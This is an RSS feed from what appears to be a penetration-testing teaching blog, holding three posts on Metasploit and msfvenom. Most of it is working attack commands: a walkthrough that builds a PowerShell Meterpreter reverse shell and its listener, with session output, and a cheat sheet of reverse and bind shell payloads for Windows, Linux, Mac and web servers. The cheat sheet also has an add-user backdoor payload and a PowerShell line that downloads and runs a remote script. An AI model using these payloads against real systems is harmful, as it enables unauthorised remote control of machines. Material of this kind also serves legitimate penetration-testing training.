<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Chatsheet on Classroom</title><link>https://classroom.anir0y.in/categories/chatsheet/</link><description>Recent content in Chatsheet on Classroom</description><generator>Anir0ry : Blog v1.0</generator><language>en</language><copyright>YOU CAN REUSE MY CONTENT</copyright><lastBuildDate>Thu, 01 Apr 2021 16:14:32 +0530</lastBuildDate><atom:link href="https://classroom.anir0y.in/categories/chatsheet/index.xml" rel="self" type="application/rss+xml"/><item><title>Msfvenom Psh</title><pubDate>Thu, 01 Apr 2021 16:14:32 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>&lt;h1 id="meterpreter-reverse-shell-with-powershell">meterpreter reverse shell with powershell&lt;/h1>
&lt;h2 id="create-shell">Create Shell&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST&lt;span style="color:#f92672">=&lt;/span>10.10.10.6 LPORT&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">443&lt;/span> -f psh -o meterpreter-64.ps1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>-&lt;span style="color:#f92672">]&lt;/span> No arch selected, selecting arch: x64 from the payload
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No encoder or badchars specified, outputting raw payload
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Payload size: &lt;span style="color:#ae81ff">510&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Final size of psh file: &lt;span style="color:#ae81ff">3255&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Saved as: meterpreter-64.ps1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="setup-listener">Setup listener&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>msfconsole -x &lt;span style="color:#e6db74">&amp;#34;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.10.6; set lport 443; set ExitOnSession false; exploit -j&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="interact">Interact&lt;/h2>
&lt;pre tabindex="0">&lt;code>...[snip]
payload =&amp;gt; windows/x64/meterpreter/reverse_tcp
lhost =&amp;gt; 10.10.10.6
lport =&amp;gt; 443
ExitOnSession =&amp;gt; false
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.10.10.6:443
msf exploit(multi/handler) &amp;gt; [*] Sending stage (206403 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.10.6:443 -&amp;gt; 10.10.10.5:53418)
msf exploit(multi/handler) &amp;gt; sessions -l
Active sessions
===============
Id Name Type Information Connection
-- ---- ---- ----------- ----------
1 meterpreter x64/windows [redacted]
&lt;/code>&lt;/pre>&lt;h2 id="if-windows-defender-is-enabled">if Windows Defender is enabled&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>PS C:\PENTEST&amp;gt; C:\PENTEST\meterpreter-&lt;span style="color:#ae81ff">64&lt;/span>.ps1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>At C:\PENTEST\meterpreter-&lt;span style="color:#ae81ff">64&lt;/span>.ps1&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> char&lt;span style="color:#960050;background-color:#1e0010">:&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>+ $VlSIhDyrsor = &lt;span style="color:#e6db74">@&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">+ ~~~~~~~~~~~~~~~~~
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">This script contains malicious content and has been blocked by your antivirus software.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">+ CategoryInfo : ParserError: (:) [], ParentContainsErrorRecordException
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">+ FullyQualifiedErrorId : ScriptContainedMaliciousContent
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">PS C:\PENTEST&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="summary">Summary:&lt;/h2>
&lt;p>The the generated ps1 can be saved to disk, and is not detected as a virus , and runs succesfull creating a shell, but it can’t run with defender enabled on windows 10 box.&lt;/p></description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/msfvenom-psh/</link></item><item><title>Msfvenom Cheatsheet</title><pubDate>Thu, 01 Apr 2021 16:11:01 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>&lt;hr>
&lt;h1 id="msfvenom-cheatsheet">MSFVenom Cheatsheet&lt;/h1>
&lt;p>Single Page Cheatsheet for common MSF Venom One Liners&lt;br>
Available in PDF, DOCX and Markdown format!
&lt;em>PDF and DOCX versions contain the payload size in bytes and a few more commands.&lt;/em>&lt;/p>
&lt;h1 id="msfvenom-cheatsheet-1">MSFVenom Cheatsheet&lt;/h1>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>MSFVenom Payload Generation One-Liner&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>msfvenom -l payloads&lt;/td>
&lt;td>List available payloads&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p PAYLOAD &amp;ndash;list-options&lt;/td>
&lt;td>List payload options&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP&lt;/td>
&lt;td>Payload Encoding&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td>
&lt;td>Linux Meterpreter reverse shell x86 multi stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td>
&lt;td>Linux Meterpreter bind shell x86 multi stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td>
&lt;td>Linux bind shell x64 single stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf&lt;/td>
&lt;td>Linux reverse shell x64 single stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe &amp;gt; shell.exe&lt;/td>
&lt;td>Windows Meterpreter reverse shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent=&amp;ldquo;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36&amp;rdquo; -f exe &amp;gt; shell.exe&lt;/td>
&lt;td>Windows Meterpreter http reverse shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe &amp;gt; shell.exe&lt;/td>
&lt;td>Windows Meterpreter bind shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe &amp;gt; shell.exe&lt;/td>
&lt;td>Windows CMD Multi Stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe &amp;gt; shell.exe&lt;/td>
&lt;td>Windows CMD Single Stage&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/adduser USER=hacker PASS=password -f exe &amp;gt; useradd.exe&lt;/td>
&lt;td>Windows add user&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p osx/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f macho &amp;gt; shell.macho&lt;/td>
&lt;td>Mac Reverse Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p osx/x86/shell_bind_tcp RHOST=IP LPORT=PORT -f macho &amp;gt; shell.macho&lt;/td>
&lt;td>Mac Bind shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p cmd/unix/reverse_python LHOST=IP LPORT=PORT -f raw &amp;gt; shell.py&lt;/td>
&lt;td>Python Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p cmd/unix/reverse_bash LHOST=IP LPORT=PORT -f raw &amp;gt; shell.sh&lt;/td>
&lt;td>BASH Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p cmd/unix/reverse_perl LHOST=IP LPORT=PORT -f raw &amp;gt; shell.pl&lt;/td>
&lt;td>PERL Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &amp;gt; shell.asp&lt;/td>
&lt;td>ASP Meterpreter shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw &amp;gt; shell.jsp&lt;/td>
&lt;td>JSP Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &amp;gt; shell.war&lt;/td>
&lt;td>WAR Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw &amp;gt; shell.php cat shell.php&lt;/td>
&lt;td>pbcopy &amp;amp;&amp;amp; echo &amp;lsquo;?php '&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw &amp;gt; phpreverseshell.php&lt;/td>
&lt;td>Php Reverse Shell&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -a x86 &amp;ndash;platform Windows -p windows/exec CMD=&amp;ldquo;powershell \&amp;ldquo;IEX(New-Object Net.webClient).downloadString(&amp;lsquo;http://IP/nishang.ps1&amp;rsquo;)&amp;quot;&amp;rdquo; -f python&lt;/td>
&lt;td>Windows Exec Nishang Powershell in python&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b &amp;ldquo;\x04\xA0&amp;rdquo;&lt;/td>
&lt;td>Bad characters shikata_ga_nai&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b &amp;ldquo;\x04\xA0&amp;rdquo;&lt;/td>
&lt;td>Bad characters fnstenv_mov&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h1 id="multihandler-listener">Multihandler Listener&lt;/h1>
&lt;p>To get multiple session on a single multi/handler, you need to set the ExitOnSession option to false and run the exploit -j instead of just the exploit. For example, for meterpreter/reverse_tcp payload,&lt;/p></description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/msfvenom-cheatsheet/</link></item><item><title>Metasploit Cheat Sheet</title><pubDate>Sun, 21 Feb 2021 21:23:22 +0530</pubDate><media:content xmlns:media="http://search.yahoo.com/mrss/" url="https://classroom.anir0y.in" width="700" height="420"/><description>&lt;h4 id="metasploit-cheat-sheet">Metasploit Cheat Sheet&lt;/h4>
&lt;p>The Metasploit Project is a computer security project that provides information on vulnerabilities, helping in the development of penetration tests and IDS signatures.&lt;/p>
&lt;p>Metasploit is a popular tool used by pentest experts. I have prepared a document for you to learn.&lt;/p>
&lt;h4 id="metasploit-">Metasploit :&lt;/h4>
&lt;h6 id="search-for-module">Search for module:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; search [regex]
&lt;/code>&lt;/pre>&lt;h6 id="specify-and-exploit-to-use">Specify and exploit to use:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; use exploit/[ExploitPath]
&lt;/code>&lt;/pre>&lt;h6 id="specify-a-payload-to-use">Specify a Payload to use:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; set PAYLOAD [PayloadPath]
&lt;/code>&lt;/pre>&lt;h6 id="show-options-for-the-current-modules">Show options for the current modules:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; show options
&lt;/code>&lt;/pre>&lt;h6 id="set-options">Set options:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; set [Option] [Value]
&lt;/code>&lt;/pre>&lt;h6 id="start-exploit">Start exploit:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; exploit
&lt;/code>&lt;/pre>&lt;h5 id="useful-auxiliary-modules">Useful Auxiliary Modules&lt;/h5>
&lt;h6 id="port-scanner">Port Scanner:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; use auxiliary/scanner/portscan/tcp
msf &amp;gt; set RHOSTS 10.10.10.0/24
msf &amp;gt; run
&lt;/code>&lt;/pre>&lt;h6 id="dns-enumeration">DNS Enumeration:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; use auxiliary/gather/dns_enum
msf &amp;gt; set DOMAIN target.tgt
msf &amp;gt; run
&lt;/code>&lt;/pre>&lt;h6 id="ftp-server">FTP Server:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; use auxiliary/server/ftp
msf &amp;gt; set FTPROOT /tmp/ftproot
msf &amp;gt; run
&lt;/code>&lt;/pre>&lt;h6 id="proxy-server">Proxy Server:&lt;/h6>
&lt;pre tabindex="0">&lt;code>msf &amp;gt; use auxiliary/server/socks4
msf &amp;gt; run
&lt;/code>&lt;/pre>&lt;h4 id="msfvenom-">msfvenom :&lt;/h4>
&lt;p>The msfvenom tool can be used to generate Metasploit payloads (such as Meterpreter) as standalone files and optionally encode
them. This tool replaces the former msfpayload and msfencode tools. Run with ‘&amp;rsquo;-l payloads’ to get a list of payloads.&lt;/p></description><enclosure url="https://classroom.anir0y.in"/><link>https://classroom.anir0y.in/post/metasploit-cheat-sheet/</link></item></channel></rss>